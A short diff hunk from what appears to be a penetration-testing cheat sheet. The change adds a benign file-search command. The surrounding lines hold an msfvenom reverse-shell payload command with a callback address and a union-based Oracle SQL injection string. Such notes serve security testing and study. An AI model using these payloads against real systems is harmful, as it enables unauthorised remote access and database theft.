@@ -203,6 +203,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.44.44 LPORT=443 -f elf-so 
 
 find command:
 find / -name network.txt
+find . -name '*.exe' #search for all exe files in the current folder
 
 Union based Oracle Sqli:
 ' or 1=1 union SELECT table_name,null,null FROM all_tables --
